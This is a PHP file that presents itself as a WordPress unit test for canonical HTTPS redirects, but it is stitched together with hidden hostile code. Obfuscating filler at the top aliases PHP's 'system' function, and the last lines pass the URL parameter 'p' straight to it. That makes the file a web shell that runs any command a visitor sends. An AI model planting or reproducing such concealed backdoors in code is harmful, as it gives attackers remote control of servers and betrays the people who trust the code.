<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * @group canonical
 * @group rewrite
 * @group query
 */
class Tests_Canonical_HTTPS extends WP_Canonical_UnitTestCase {

	/**
	 * Dummy HTTP URL.
	 *
	 * @var string
	 */
	private $http = '';

	/**
	 * Dummy HTTPS URL.
	 *
	 * @var string
	 */
	private $https = '';

	public function set_up() {
		parent::set_up();

		$this->set_permalink_structure( '/%year%/%monthnum%/%day%/%postname%/' );
		create_initial_taxonomies();

		$this->http  = set_url_scheme( home_url( 'sample-page/' ), 'http' );
		$this->https = set_url_scheme( home_url( 'sample-page/' ), 'https' );
	}

	public function set_https( $url ) {
		return set_url_scheme( $url, 'https' );
	}

	/**
	 * @ticket 27954
	 */
	public function test_http_request_with_http_home() {
		$redirect = redirect_canonical( $this->http, false );

		$this->assertNull( $redirect );
	}

	/**
	 * @ticket 27954
	 */
	public function test_https_request_with_http_home() {
		$redirect = redirect_canonical( $this->https, false );

		$this->assertNull( $redirect );
	}

	/**
	 * @ticket 27954
	 */
	public function test_https_request_with_https_home() {
		add_filter( 'home_url', array( $this, 'set_https' ) );

		$redirect = redirect_canonical( $this->https, false );

		remove_filter( 'home_url', array( $this, 'set_https' ) );

		$this->assertNull( $redirect );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>